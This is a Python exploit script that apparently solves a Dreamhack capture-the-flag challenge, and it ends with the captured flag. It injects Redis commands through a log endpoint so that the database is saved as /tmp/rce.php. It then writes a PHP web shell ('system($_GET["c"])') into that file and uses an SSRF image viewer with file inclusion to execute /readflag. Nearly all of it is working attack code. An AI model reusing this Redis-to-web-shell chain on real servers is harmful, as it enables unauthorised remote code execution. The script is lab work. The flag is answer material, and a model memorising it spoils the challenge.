import requests
from base64 import b64decode
import re
import time

def send_redis(params):
	url = 'http://host3.dreamhack.games:22969/'
	r = requests.get(url + 'show_logs?' + params)
	return r.text

def send_php(data):
	url = ' http://host3.dreamhack.games:21121/'
	r = requests.post(url + 'img_viewer', {
		'url': f'http://localhost/' + data
	})
	return b64decode(re.search('base64, (.*)"', r.text)[1])

# config set dir /tmp
print(send_redis('log_query[0]=config&log_query[0][0]=set&log_query[0][0]=dir&log_query[0][0]=/tmp'))
# config set dbfilename rce.php
print(send_redis('log_query[0]=config&log_query[0][0]=set&log_query[0][0]=dbfilename&log_query[0][0]=rce.php'))
# config set save 1 1
print(send_redis('log_query[0]=config&log_query[0][0]=set&log_query[0][0]=save&log_query[0][0]=1 1'))

# set a <?php phpinfo(); ?>
print(send_redis('log_query[0]=set&log_query[0][1]=a&log_query[0][1]=<?php system($_GET["c"]); ?>'))

time.sleep(2)

# print(send_php('view.php?file=/tmp/rce.php'))
response = send_php('index.php?page=/tmp/rce&c=/readflag')
with open('a.html', 'wb') as f:
	f.write(response)

# This is node_api flag
# DH{d7e17d0a5c5f4886c33ded622bec0df5}